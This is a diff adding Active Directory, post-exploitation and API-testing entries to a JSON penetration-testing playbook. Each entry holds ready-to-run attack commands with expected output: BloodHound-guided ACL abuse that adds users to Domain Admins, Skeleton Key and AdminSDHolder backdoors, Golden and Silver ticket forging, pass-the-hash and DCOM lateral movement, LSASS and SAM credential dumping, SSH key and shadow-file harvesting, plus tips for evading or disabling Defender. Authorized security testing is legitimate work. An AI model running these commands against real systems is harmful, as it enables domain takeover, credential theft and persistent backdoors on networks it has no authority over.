@@ -241,6 +241,105 @@
     ]
   },
   {
+    "id": "bloodhound",
+    "name": "BloodHound Analysis & Attack Path Discovery",
+    "category": "ad",
+    "description": "Collect Active Directory relationship data using SharpHound or bloodhound-python, execute high-value Cypher queries to find shortest paths to Domain Admin, and abuse ACL relationships.",
+    "port_triggers": [
+      88,
+      389,
+      445,
+      636
+    ],
+    "tags": [
+      "bloodhound",
+      "sharphound",
+      "cypher",
+      "acl-abuse",
+      "attack-paths",
+      "active-directory"
+    ],
+    "steps": [
+      {
+        "id": "bloodhound-python-ingest",
+        "title": "Domain Ingestion via bloodhound-python (Remote / Linux)",
+        "phase": "enumeration",
+        "purpose": "Collect all AD users, groups, computers, sessions, trusts, and ACLs remotely from Linux using valid domain credentials.",
+        "command": "bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN|corp.local}}' -dc '{{TARGET}}' -c All --zip -ns {{TARGET}}",
+        "expected_output": [
+          "[+] Connecting to LDAP server...",
+          "[+] Dumping domain users, groups, computers, trusts...",
+          "[+] Compressing output into bloodhound_TIMESTAMP.zip"
+        ],
+        "common_mistakes": [
+          "Ensure DNS resolution for domain FQDN or specify `-ns <DC_IP>` and `-dc <DC_IP>`."
+        ],
+        "if_success": "BloodHound ZIP archive generated. Import into Neo4j/BloodHound GUI for graph analysis.",
+        "if_failure": "LDAP authentication failed or LDAPS required. Check credentials or try `-s` for SSL LDAP.",
+        "references": [
+          "https://github.com/SpecterOps/BloodHound",
+          "https://wadcoms.github.io/"
+        ]
+      },
+      {
+        "id": "bloodhound-sharphound-ingest",
+        "title": "SharpHound Ingestor Execution (Windows Shell)",
+        "phase": "enumeration",
+        "purpose": "Execute SharpHound on a compromised Windows domain joined host to collect session data, local admin memberships, and object relationships.",
+        "command": ".\\\\SharpHound.exe -c All --outputdirectory C:\\\\Windows\\\\Temp --zipfilename bh_data.zip",
+        "expected_output": [
+          "[*] Initializing SharpHound...",
+          "[*] Resolving Domain Controllers...",
+          "[*] SharpHound Enumeration Completed. Zip file written to C:\\Windows\\Temp\\bh_data.zip"
+        ],
+        "common_mistakes": [
+          "Windows Defender may block SharpHound. Use memory injection, PowerShell reflection, or obfuscated builds."
+        ],
+        "if_success": "Comprehensive session and group relationship data extracted. Transfer `bh_data.zip` to attacker system.",
+        "if_failure": "Antivirus intercepted or restricted user cannot query domain. Check Defender logs.",
+        "references": [
+          "https://bloodhound.readthedocs.io/"
+        ]
+      },
+      {
+        "id": "bloodhound-high-value-cypher",
+        "title": "Query Shortest Paths to Domain Admins & Unconstrained Delegation",
+        "phase": "enumeration",
+        "purpose": "Execute Cypher queries within BloodHound to identify privilege paths, DCSync rights, and unconstrained delegation hosts.",
+        "command": "MATCH (m:User {name:'{{USERNAME|USER}}@{{DOMAIN|CORP.LOCAL}}'}),(n:Group {name:'DOMAIN ADMINS@{{DOMAIN|CORP.LOCAL}}'}), p=shortestPath((m)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|GenericAll|GenericWrite|WriteDacl|WriteOwner*1..]->(n)) RETURN p",
+        "expected_output": [
+          "Shortest graph path displayed linking compromised user to Domain Admins group via intermediate hops."
+        ],
+        "common_mistakes": [
+          "BloodHound node names are uppercase (e.g. `USER@DOMAIN.LOCAL`)."
+        ],
+        "if_success": "Actionable attack path identified! Execute specific ACL abuse or session takeover.",
+        "if_failure": "No direct path from current user. Expand search to all Kerberoastable or AS-REP roastable accounts.",
+        "references": [
+          "https://bloodhound.readthedocs.io/en/latest/data-analysis/cypher-query-language.html"
+        ]
+      },
+      {
+        "id": "bloodhound-genericall-abuse",
+        "title": "Abuse GenericAll / GenericWrite on Target User or Group",
+        "phase": "exploitation",
+        "purpose": "Leverage full control (GenericAll) or WriteDacl permissions on an AD object to reset password, grant rights, or add user to Domain Admins.",
+        "command": "netexec smb {{TARGET}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN|corp.local}}' -M dacl -o ACTION=add-member TARGET_GROUP='Domain Admins' USER='{{USERNAME}}'",
+        "expected_output": [
+          "[+] Successfully added user to group: Domain Admins"
+        ],
+        "common_mistakes": [
+          "Ensure you have write permission on the target group object or WriteDacl."
+        ],
+        "if_success": "Current user added to Domain Admins! Relog or request new TGT.",
+        "if_failure": "Insufficient permissions. Check BlooHound for intermediary objects (e.g. nested group memberships).",
+        "references": [
+          "https://wadcoms.github.io/"
+        ]
+      }
+    ]
+  },
+  {
     "id": "delegation-rbcd",
     "name": "Kerberos Delegation & RBCD Exploitation",
     "category": "ad",
@@ -313,6 +412,311 @@
         ],
         "if_success": "Service ticket forged! Use with `export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass {{TARGET}}`.",
         "if_failure": "Account not allowed to delegate to target SPN.",
+        "references": [
+          "https://wadcoms.github.io/"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "domain-persistence",
+    "name": "Active Directory Domain Persistence",
+    "category": "ad",
+    "description": "High-impact Active Directory persistence mechanisms including Skeleton Key injection, DCShadow rogue DC replication, AdminSDHolder ACL backdoors, DSRM password sync, and SID History injection.",
+    "port_triggers": [
+      88,
+      389,
+      445
+    ],
+    "requires_shell": true,
+    "target_os": "windows",
+    "tags": [
+      "persistence",
+      "skeleton-key",
+      "dcshadow",
+      "adminsdholder",
+      "dsrm",
+      "sid-history"
+    ],
+    "steps": [
+      {
+        "id": "persist-skeleton-key",
+        "title": "Inject Skeleton Key into LSASS on Domain Controller",
+        "phase": "post-exploitation",
+        "purpose": "Patch the LSASS process on the Domain Controller to inject a master password (`mimikatz`) for ALL Active Directory domain accounts simultaneously without changing user passwords.",
+        "command": "mimikatz.exe \"privilege::debug\" \"misc::skeleton\" exit",
+        "expected_output": [
+          "Privilege '20' OK",
+          "Patching Kerberos for [DOMAIN]",
+          "Patching NTLM for [DOMAIN]",
+          "Skeleton Key injected"
+        ],
+        "common_mistakes": [
+          "Requires DA / SYSTEM shell on the Domain Controller directly.",
+          "Resets on Domain Controller reboot."
+        ],
+        "if_success": "Master password `mimikatz` is now active for all domain users via NTLM and Kerberos.",
+        "if_failure": "LSASS protected by RunAsPPL or EDR blocked in-memory patching.",
+        "references": [
+          "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/skeleton-key"
+        ]
+      },
+      {
+        "id": "persist-adminsdholder",
+        "title": "AdminSDHolder ACL Backdoor Injection",
+        "phase": "post-exploitation",
+        "purpose": "Add GenericAll permissions for an unprivileged user on `CN=AdminSDHolder,CN=System,DC=corp,DC=local`. The SDProp process will automatically grant DA access every 60 minutes.",
+        "command": "powershell -ep bypass -c \"Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC={{DOMAIN|corp,DC=local}}' -PrincipalIdentity '{{USERNAME}}' -Rights All -Verbose\"",
+        "expected_output": [
+          "VERBOSE: Adding Rights All on AdminSDHolder for {{USERNAME}}"
+        ],
+        "common_mistakes": [
+          "Wait up to 60 minutes for SDProp process to cycle or force SDProp via LDAP trigger."
+        ],
+        "if_success": "Unprivileged user will automatically regain full control of all Protected Groups (Domain Admins, Enterprise Admins).",
+        "if_failure": "Insufficient permissions to modify AdminSDHolder container.",
+        "references": [
+          "https://wadcoms.github.io/"
+        ]
+      },
+      {
+        "id": "persist-dsrm-sync",
+        "title": "Directory Services Restore Mode (DSRM) Persistence",
+        "phase": "post-exploitation",
+        "purpose": "Synchronize the local DSRM administrator password with a domain account and enable network logon (behavior 2) to maintain a stealthy local admin backdoor on DCs.",
+        "command": "powershell -ep bypass -c \"Set-ItemProperty -Path 'HKLM:\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa' -Name 'DsrmAdminLogonBehavior' -Value 2 -Type DWord; ntdsutil \\\"set dsrm password\\\" \\\"sync from domain account {{USERNAME}}\\\" q q\"",
+        "expected_output": [
+          "Password for DSRM Administrator account synchronized successfully"
+        ],
+        "common_mistakes": [
+          "Must set `DsrmAdminLogonBehavior=2` in registry or DSRM login is only allowed when booting into DSRM safe mode."
+        ],
+        "if_success": "DSRM admin backdoor active. Authenticate via `evil-winrm -u Administrator -H <HASH> -i <DC_IP>`.",
+        "if_failure": "Registry modification restricted by local policy.",
+        "references": [
+          "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dsrm-persistence"
+        ]
+      },
+      {
+        "id": "persist-sid-history",
+        "title": "SID History Injection via Mimikatz",
+        "phase": "post-exploitation",
+        "purpose": "Inject the Domain Admins SID (`S-1-5-21-...-512`) into an unprivileged user's `sIDHistory` attribute to grant administrative rights silently.",
+        "command": "mimikatz.exe \"privilege::debug\" \"sid::add /sam:{{USERNAME}} /new:Domain Admins\" exit",
+        "expected_output": [
+          "sIDHistory modified successfully"
+        ],
+        "common_mistakes": [
+          "Requires domain trust or schema-level privileges if done across trusts."
+        ],
+        "if_success": "Target standard user now possesses Domain Admin token privileges when logging in!",
+        "if_failure": "DC Auditing or protected account restriction.",
+        "references": [
+          "https://wadcoms.github.io/"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "kerberos-tickets",
+    "name": "Kerberos Tickets (Golden, Silver & Pass-the-Ticket)",
+    "category": "ad",
+    "description": "Deep exploitation guide for forging Golden Tickets (krbtgt), Silver Tickets (CIFS, HTTP, MSSQL, HOST, WSMAN), Pass-the-Ticket injection, and lateral movement using forged TGS/TGT tickets.",
+    "port_triggers": [
+      88,
+      445,
+      389
+    ],
+    "tags": [
+      "kerberos",
+      "silver-ticket",
+      "golden-ticket",
+      "pass-the-ticket",
+      "rubeus",
+      "mimikatz",
+      "ticketer"
+    ],
+    "steps": [
+      {
+        "id": "kerb-silver-ticket-impacket",
+        "title": "Forge Silver Ticket for Target Service (Impacket ticketer.py)",
+        "phase": "exploitation",
+        "purpose": "Forge an offline Kerberos Service Ticket (TGS) using the target service account NTLM/AES hash to access specific service (CIFS, HTTP, MSSQL) without contacting DC.",
+        "command": "ticketer.py -nthash {{HASH}} -domain-sid {{DOMAIN_SID|S-1-5-21-...}} -domain {{DOMAIN|corp.local}} -spn cifs/{{TARGET_HOST|dc.corp.local}} -user-id 500 Administrator",
+        "expected_output": [
+          "[*] Creating basic ticket",
+          "[*] Saving ticket in Administrator.ccache"
+        ],
+        "common_mistakes": [
+          "Domain SID must be obtained from user account `whoami /user` or `lookupsid.py`.",
+          "SPN format must match target service hostname exactly (e.g. `cifs/target.corp.local` or `MSSQLSvc/db.corp.local:1433`)."
+        ],
+        "if_success": "Silver Ticket `Administrator.ccache` generated! Set `KRB5CCNAME` and use ticket.",
+        "if_failure": "Invalid service hash or mismatched domain SID. Validate with `lookupsid.py`.",
+        "references": [
+          "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket",
+          "https://github.com/fortra/impacket"
+        ]
+      },
+      {
+        "id": "kerb-silver-ticket-mimikatz",
+        "title": "Forge Silver Ticket & Inject via Mimikatz (Windows)",
+        "phase": "exploitation",
+        "purpose": "Generate a Silver Ticket in memory on a Windows compromised host and immediately inject it into the current logon session (Pass-the-Ticket).",
+        "command": "mimikatz.exe \"kerberos::golden /domain:{{DOMAIN|corp.local}} /sid:{{DOMAIN_SID|S-1-5-21-...}} /target:{{TARGET_HOST|dc.corp.local}} /service:cifs /rc4:{{HASH}} /user:Administrator /ptt\" exit",
+        "expected_output": [
+          "User      : Administrator",
+          "Domain    : corp.local",
+          "Service   : cifs",
+          "Target    : dc.corp.local",
+          "Gold Ticket successfully submitted for current session"
+        ],
+        "common_mistakes": [
+          "RC4 requires NTLM hash of the computer account (e.g. `DC01$`) or service account, NOT the administrator account."
+        ],
+        "if_success": "Ticket injected! Access target service immediately with `dir \\\\\\\\dc.corp.local\\\\c$`.",
+        "if_failure": "Verify SPN service name matches target (cifs, http, mssql, host, wsman).",
+        "references": [
+          "https://wadcoms.github.io/"
+        ]
+      },
+      {
+        "id": "kerb-golden-ticket-impacket",
+        "title": "Forge Golden Ticket with krbtgt Hash (Full Domain Compromise)",
+        "phase": "post-exploitation",
+        "purpose": "Forge an offline Kerberos Ticket Granting Ticket (TGT) using the domain `krbtgt` NTLM or AES-256 key to achieve total domain persistence and admin access to any service.",
+        "command": "ticketer.py -nthash {{KRBTGT_HASH}} -domain-sid {{DOMAIN_SID|S-1-5-21-...}} -domain {{DOMAIN|corp.local}} -extra-sid {{ENTERPRISE_ADMIN_SID}} Administrator",
+        "expected_output": [
+          "[*] Creating basic ticket",
+          "[*] Customizing ticket for Administrator",
+          "[*] Saving ticket in Administrator.ccache"
+        ],
+        "common_mistakes": [
+          "krbtgt hash must be acquired via DCSync (`secretsdump.py`)."
+        ],
+        "if_success": "Golden Ticket generated! Authenticate against any domain service for up to 10 years.",
+        "if_failure": "Ensure correct domain SID format and krbtgt NTLM hash.",
+        "references": [
+          "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket"
+        ]
+      },
+      {
+        "id": "kerb-pass-the-ticket-linux",
+        "title": "Pass-the-Ticket (PTT) Execution on Linux",
+        "phase": "exploitation",
+        "purpose": "Export the forged or extracted `.ccache` ticket into the Linux environment variable `KRB5CCNAME` and execute remote administrative commands.",
+        "command": "export KRB5CCNAME=Administrator.ccache && netexec smb {{TARGET_HOST|dc.corp.local}} -k --use-kcache",
+        "expected_output": [
+          "[+] corp.local\\\\Administrator (Pwn3d!)"
+        ],
+        "common_mistakes": [
+          "Target must be referenced by FQDN (e.g. `dc.corp.local`), NOT by raw IP, when using Kerberos authentication.",
+          "Ensure system time is synchronized with DC within 5 minutes (`sudo rdate -n <DC_IP>` or `ntpdate`)."
+        ],
+        "if_success": "Authenticated via Kerberos ticket! Run `psexec.py -k -no-pass` or `smbexec.py -k -no-pass` for interactive SYSTEM shell.",
+        "if_failure": "Time skew error or FQDN not in `/etc/hosts`. Add `<DC_IP> <DOMAIN> <DC_HOSTNAME>.<DOMAIN>` to `/etc/hosts`.",
+        "references": [
+          "https://wadcoms.github.io/"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "lateral-movement",
+    "name": "Active Directory Lateral Movement & Execution",
+    "category": "ad",
+    "description": "Methods and tools for moving laterally across Windows domain workstations and servers using PsExec, WMI, WinRM, Pass-the-Hash, Overpass-the-Hash, DCOM, and Scheduled Tasks.",
+    "port_triggers": [
+      135,
+      445,
+      5985,
+      5986
+    ],
+    "tags": [
+      "lateral-movement",
+      "psexec",
+      "wmi",
+      "winrm",
+      "pass-the-hash",
+      "dcom",
+      "impacket"
+    ],
+    "steps": [
+      {
+        "id": "lateral-pass-the-hash-smb",
+        "title": "Pass-the-Hash (PTH) SMB & WMI Execution",
+        "phase": "exploitation",
+        "purpose": "Execute commands or interactive shells remotely using an extracted NTLM hash without knowing the plaintext password.",
+        "command": "netexec smb {{TARGET}} -u '{{USERNAME}}' -H '{{HASH}}' -d '{{DOMAIN|corp.local}}' -x 'whoami /priv'",
+        "expected_output": [
+          "[+] corp.local\\\\{{USERNAME}}:*** (Pwn3d!)",
+          "SeDebugPrivilege                Enabled"
+        ],
+        "common_mistakes": [
+          "Pass full LM:NTLM format (e.g. `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`) or just 32-char NT hash."
+        ],
+        "if_success": "Remote execution verified! Proceed to spawn interactive shell via `psexec.py`, `wmiexec.py`, or `evil-winrm`.",
+        "if_failure": "Access denied or UAC token filtering (`LocalAccountTokenFilterPolicy=0`). Try built-in RID 500 Administrator account.",
+        "references": [
+          "https://wadcoms.github.io/"
+        ]
+      },
+      {
+        "id": "lateral-wmiexec-interactive",
+        "title": "WMI Execution via Impacket (Stealthy, No Service Created)",
+        "phase": "exploitation",
+        "purpose": "Execute commands stealthily over WMI (Port 135 & high RPC ports) without dropping binary services like PsExec.",
+        "command": "wmiexec.py '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET}}'",
+        "expected_output": [
+          "[*] SMBv3.0 dialect used",
+          "[*] Spawning semi-interactive shell",
+          "C:\\>"
+        ],
+        "common_mistakes": [
+          "WMI requires TCP port 135 and dynamic RPC high ports (49152-65535) open on firewall."
+        ],
+        "if_success": "Semi-interactive command shell established on target system!",
+        "if_failure": "RPC ports blocked by firewall. Fall back to SMB-based `smbexec.py` or WinRM.",
+        "references": [
+          "https://github.com/fortra/impacket"
+        ]
+      },
+      {
+        "id": "lateral-dcom-exec",
+        "title": "DCOM Remote Execution (MMC20.Application / ShellWindows)",
+        "phase": "exploitation",
+        "purpose": "Execute code via Distributed Component Object Model (DCOM) objects to bypass endpoint detection monitoring PsExec/Service creation.",
+        "command": "dcomexec.py '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET}}' -object MMC20",
+        "expected_output": [
+          "[*] Connecting to DCOM...",
+          "[*] Object MMC20 instantiated",
+          "C:\\>"
+        ],
+        "common_mistakes": [
+          "Target must allow incoming DCOM requests and account must have administrative rights."
+        ],
+        "if_success": "Interactive DCOM shell obtained!",
+        "if_failure": "DCOM disabled or blocked. Try `-object ShellWindows` or `ShellBrowserWindow`.",
+        "references": [
+          "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/lateral-movement-dcom"
+        ]
+      },
+      {
+        "id": "lateral-scheduled-tasks",
+        "title": "Remote Scheduled Task Execution (Schtasks / Atexec)",
+        "phase": "exploitation",
+        "purpose": "Create and execute a one-time remote scheduled task to run an attacker payload or beacon with SYSTEM privileges.",
+        "command": "atexec.py '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET}}' 'whoami'",
+        "expected_output": [
+          "[*] Attempting to connect to Task Scheduler...",
+          "[*] Task created successfully",
+          "[*] Task output: nt authority\\system"
+        ],
+        "common_mistakes": [
+          "Task Scheduler service must be running and clock synchronized."
+        ],
+        "if_success": "Code executed as NT AUTHORITY\\SYSTEM! Drop reverse shell payload for persistence.",
+        "if_failure": "Remote Task Scheduler RPC interface blocked.",
         "references": [
           "https://wadcoms.github.io/"
         ]
@@ -2491,6 +2895,120 @@
     ]
   },
   {
+    "id": "linux-credential-hunting",
+    "name": "Linux Post-Exploitation & Credential Hunting",
+    "category": "post-exploitation",
+    "description": "Systematic methodology for extracting cleartext passwords, API keys, private SSH keys, memory artifacts, bash histories, Docker sockets, and database configurations on Linux hosts.",
+    "port_triggers": [],
+    "requires_shell": true,
+    "target_os": "linux",
+    "tags": [
+      "post-exploitation",
+      "linux",
+      "credential-hunting",
+      "ssh-keys",
+      "bash-history",
+      "docker",
+      "memory-dump"
+    ],
+    "steps": [
+      {
+        "id": "lcred-shell-history-env",
+        "title": "Shell History, Environment & Session Credential Discovery",
+        "phase": "post-exploitation",
+        "purpose": "Inspect bash/zsh command histories, environment variables, and active processes for hardcoded passwords, tokens, and credentials.",
+        "command": "cat ~/.bash_history ~/.zsh_history /root/.bash_history 2>/dev/null | grep -iE 'pass|pwd|secret|key|token|ssh|admin|login|mysql|curl|sudo' | head -n 40; env | grep -iE 'pass|token|secret|key|db'",
+        "expected_output": [
+          "mysql -u root -pPassword123",
+          "export AWS_SECRET_ACCESS_KEY=..."
+        ],
+        "common_mistakes": [
+          "Users might have set HISTCONTROL=ignorespace. Check /var/log/auth.log or syslog if readable."
+        ],
+        "if_success": "Plaintext credentials discovered! Test on local su root and across target network services.",
+        "if_failure": "History files sanitized or empty. Proceed to file system configuration hunting.",
+        "references": [
+          "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sensitive-files"
+        ]
+      },
+      {
+        "id": "lcred-ssh-keys-hunting",
+        "title": "Harvest SSH Private Keys & Authorized Keys",
+        "phase": "post-exploitation",
+        "purpose": "Locate and extract unprotected RSA/ECDSA/ED25519 private SSH keys across /home, /root, backups, and temporary directories.",
+        "command": "find / -name \"id_rsa*\" -o -name \"id_ed25519*\" -o -name \"id_ecdsa*\" -o -name \"authorized_keys\" 2>/dev/null | grep -v \"/proc/\" | while read line; do ls -la \"$line\"; cat \"$line\" 2>/dev/null | head -n 5; done",
+        "expected_output": [
+          "-----BEGIN OPENSSH PRIVATE KEY-----",
+          "-----BEGIN RSA PRIVATE KEY-----"
+        ],
+        "common_mistakes": [
+          "Remember to set chmod 600 id_rsa on your attacker machine before attempting SSH connection."
+        ],
+        "if_success": "Private SSH key extracted! Attempt SSH login `ssh -i id_rsa user@{{TARGET}}`.",
+        "if_failure": "SSH keys encrypted with passphrase. Crack passphrase using ssh2john.py and John the Ripper.",
+        "references": [
+          "https://book.hacktricks.xyz/linux-hardening/privilege-escalation"
+        ]
+      },
+      {
+        "id": "lcred-config-web-db-hunting",
+        "title": "Search Configuration Files & Database Credentials",
+        "phase": "post-exploitation",
+        "purpose": "Search common web and database config files (wp-config.php, config.php, .env, settings.py, database.yml) for database and administrative passwords.",
+        "command": "grep -rnwiE --color=always 'password|passwd|db_pass|secret_key|api_key' /var/www/ /etc/ /opt/ /srv/ 2>/dev/null | grep -vE 'Binary file|node_modules|.git|/usr/share/' | head -n 50",
+        "expected_output": [
+          "DB_PASSWORD=SuperSecretPass2026!",
+          "define( 'DB_PASSWORD', 'wp_db_pass' );"
+        ],
+        "common_mistakes": [
+          "Don't forget hidden .env and .git/config files (find / -name \".env\" 2>/dev/null)."
+        ],
+        "if_success": "Database credentials found! Access database or test password reuse against local root.",
+        "if_failure": "No passwords found in common paths. Search user home directories.",
+        "references": [
+          "https://book.hacktricks.xyz/linux-hardening/privilege-escalation"
+        ]
+      },
+      {
+        "id": "lcred-docker-socket-abuse",
+        "title": "Docker Socket Abuse for Root Filesystem Mounting",
+        "phase": "privesc",
+        "purpose": "If the current user has access to /var/run/docker.sock or belongs to the docker group, spawn a container with the root host filesystem mounted at /mnt.",
+        "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh -c 'id; cat /etc/shadow | head -n 5'",
+        "expected_output": [
+          "uid=0(root) gid=0(root) groups=0(root)",
+          "root:$6$...:19000:0:99999:7:::"
+        ],
+        "common_mistakes": [
+          "If alpine is not present locally, check docker images and use whatever image exists on target."
+        ],
+        "if_success": "Full root access to host filesystem! Add root user to /etc/passwd or copy /etc/shadow.",
+        "if_failure": "Docker daemon not accessible or user not in docker group.",
+        "references": [
+          "https://gtfobins.github.io/gtfobins/docker/"
+        ]
+      },
+      {
+        "id": "lcred-shadow-passwd-hash-dump",
+        "title": "Dump /etc/shadow & Extract Hashes for Cracking",
+        "phase": "post-exploitation",
+        "purpose": "Read or unshadow /etc/passwd and /etc/shadow to extract password hashes for offline dictionary cracking with hashcat/John.",
+        "command": "unshadow /etc/passwd /etc/shadow > unshadowed.txt && head -n 10 unshadowed.txt",
+        "expected_output": [
+          "root:$6$salt$encrypted_hash:0:0:root:/root:/bin/bash"
+        ],
+        "common_mistakes": [
+          "Requires read permission on /etc/shadow (or root/shadow group)."
+        ],
+        "if_success": "Hashes dumped! Run hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt",
+        "if_failure": "/etc/shadow permission denied. Continue local privilege escalation triage.",
+        "references": [
+          "https://hashcat.net/wiki/doku.php?id=example_hashes"
+        ]
+      }
+    ]
+  },
+  {
     "id": "lolbas-gtfobins",
     "name": "Living Off The Land (LOLBAS & GTFOBins)",
     "category": "privesc",
@@ -2733,6 +3251,458 @@
     ]
   },
   {
+    "id": "windows-credential-hunting",
+    "name": "Windows Post-Exploitation & Credential Hunting",
+    "category": "post-exploitation",
+    "description": "Complete post-exploitation checklist for dumping credentials on Windows systems including LSASS memory, SAM/SYSTEM hives, DPAPI blobs, Credential Manager, Vault, Browser data, Unattend files, and KeePass.",
+    "port_triggers": [],
+    "requires_shell": true,
+    "target_os": "windows",
+    "tags": [
+      "post-exploitation",
+      "windows",
+      "lsass",
+      "sam",
+      "dpapi",
+      "mimikatz",
+      "pypykatz",
+      "secretsdump"
+    ],
+    "steps": [
+      {
+        "id": "wcred-lsass-comsvcs-dump",
+        "title": "Native LSASS Dump via comsvcs.dll (No External Tools)",
+        "phase": "post-exploitation",
+        "purpose": "Create a full minidump of the LSASS memory space natively using PowerShell and built-in Windows DLL `comsvcs.dll` to bypass basic executable blockers.",
+        "command": "powershell -ep bypass -c \"$p = (Get-Process lsass).Id; rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump $p C:\\\\Windows\\\\Temp\\\\lsass.dmp full; ls C:\\\\Windows\\\\Temp\\\\lsass.dmp\"",
+        "expected_output": [
+          "Mode                LastWriteTime         Length Name",
+          "-a----        ...   ...                   ...    lsass.dmp"
+        ],
+        "common_mistakes": [
+          "Requires Administrator / SYSTEM shell with `SeDebugPrivilege`.",
+          "Modern Defender may detect `comsvcs.dll` arguments. If blocked, try ProcDump or Task Manager GUI dump."
+        ],
+        "if_success": "Memory dump created! Download `lsass.dmp` and parse with `pypykatz lsa minidump lsass.dmp`.",
+        "if_failure": "Defender blocked memory read. Run `Set-MpPreference -DisableRealtimeMonitoring $true` if elevated.",
+        "references": [
+          "https://book.hacktricks.xyz/windows-hardening/stealing-credentials"
+        ]
+      },
+      {
+        "id": "wcred-sam-system-registry-save",
+        "title": "Extract SAM, SYSTEM, and SECURITY Registry Hives",
+        "phase": "post-exploitation",
+        "purpose": "Save the SAM and SYSTEM registry hives to disk to extract all local user NTLM hashes, cached domain credentials, and LSA secrets offline.",
+        "command": "reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\sam.hive /y && reg save HKLM\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\system.hive /y && reg save HKLM\\\\SECURITY C:\\\\Windows\\\\Temp\\\\security.hive /y",
+        "expected_output": [
+          "The operation completed successfully."
+        ],
+        "common_mistakes": [
+          "Requires local Administrator rights."
+        ],
+        "if_success": "Registry hives saved! Extract hashes with `secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL`.",
+        "if_failure": "Access denied. Ensure executing from an elevated command prompt.",
+        "references": [
+          "https://wadcoms.github.io/"
+        ]
+      },
+      {
+        "id": "wcred-unattend-autologon-hunting",
+        "title": "Search Unattend.xml, Autologon & Configuration Passwords",
+        "phase": "post-exploitation",
+        "purpose": "Search common installation artifacts, Sysprep files, and registry keys for plaintext administrative passwords and autologon credentials.",
+        "command": "type C:\\\\Windows\\\\Panther\\\\Unattend.xml 2>nul; type C:\\\\Windows\\\\Panther\\\\Unattended.xml 2>nul; reg query \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\" /v DefaultPassword 2>nul; reg query \"HKCU\\\\Software\\\\SimonTatham\\\\PuTTY\\\\Sessions\" /s 2>nul",
+        "expected_output": [
+          "<AdministratorPassword><Value>...</Value>",
+          "DefaultPassword    REG_SZ    Password123"
+        ],
+        "common_mistakes": [
+          "XML values may be base64 encoded. Decode with `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($val))`."
+        ],
+        "if_success": "Plaintext credentials discovered! Test on local and remote services.",
+        "if_failure": "No unattend files found. Search user directories for `.kdbx` (KeePass) or `.config` files.",
+        "references": [
+          "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unattended-files"
+        ]
+      },
+      {
+        "id": "wcred-wifi-dpapi-hunting",
+        "title": "Dump Saved WiFi Profiles & Vault Credentials",
+        "phase": "post-exploitation",
+        "purpose": "Extract all saved wireless network cleartext WPA2/WPA3 pre-shared keys and inspect Windows Vault credentials.",
+        "command": "netsh wlan show profiles; cmdkey /list; powershell -ep bypass -c \"Get-ChildItem -Path C:\\\\Users\\\\*\\\\AppData\\\\Local\\\\Microsoft\\\\Credentials\\\\ -Recurse 2>$null\"",
+        "expected_output": [
+          "Key Content            : CorporateWiFiPass2026!",
+          "Target: WindowsLive:target=..."
+        ],
+        "common_mistakes": [
+          "Export specific profile key with `netsh wlan show profile name=\"<PROFILE>\" key=clear`."
+        ],
+        "if_success": "WiFi or Credential Manager targets found!",
+        "if_failure": "No wireless cards configured on virtual machine.",
+        "references": [
+          "https://book.hacktricks.xyz/windows-hardening/stealing-credentials"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "api-security",
+    "name": "API Security Testing (REST, GraphQL & JWT)",
+    "category": "web",
+    "description": "Comprehensive testing methodology for modern APIs including REST endpoints, GraphQL schema introspection, Broken Object Level Auth (BOLA/IDOR), Mass Assignment, JWT token tampering, and API fuzzing.",
+    "port_triggers": [
+      80,
+      443,
+      3000,
+      5000,
+      8000,
+      8080,
+      8443
+    ],
+    "tags": [
+      "api",
+      "graphql",
+      "jwt",
+      "bola",
+      "idor",
+      "rest",
+      "mass-assignment"
+    ],
+    "steps": [
+      {
+        "id": "api-kiterunner-fuzzing",
+        "title": "API Route Discovery via Kiterunner & FFUF",
+        "phase": "reconnaissance",
+        "purpose": "Discover hidden REST API routes, API version prefixes (/v1, /v2, /api/v3), Swagger documentation, and OpenAPI schemas.",
+        "command": "kr scan http://{{TARGET}}:{{PORT|80}}/ -w /usr/share/kiterunner/routes-large.kite --max-connection-per-host 20; ffuf -u http://{{TARGET}}:{{PORT|80}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt -mc 200,204,301,302,401,403",
+        "expected_output": [
+          "[200] http://{{TARGET}}:{{PORT|80}}/api/v1/users",
+          "[200] http://{{TARGET}}:{{PORT|80}}/swagger/v1/swagger.json"
+        ],
+        "common_mistakes": [
+          "Always test alternate API prefixes like /api, /rest, /graphql, /v1, /v2, /internal/api."
+        ],
+        "if_success": "API endpoints or Swagger documentation identified! Review API definitions for authentication schemas.",
+        "if_failure": "No common routes discovered. Inspect client-side JavaScript files for hidden API paths.",
+        "references": [
+          "https://github.com/assetnote/kiterunner",
+          "https://portswigger.net/web-security/api-testing"
+        ]
+      },
+      {
+        "id": "api-graphql-introspection",
+        "title": "GraphQL Schema Introspection & Query Harvesting",
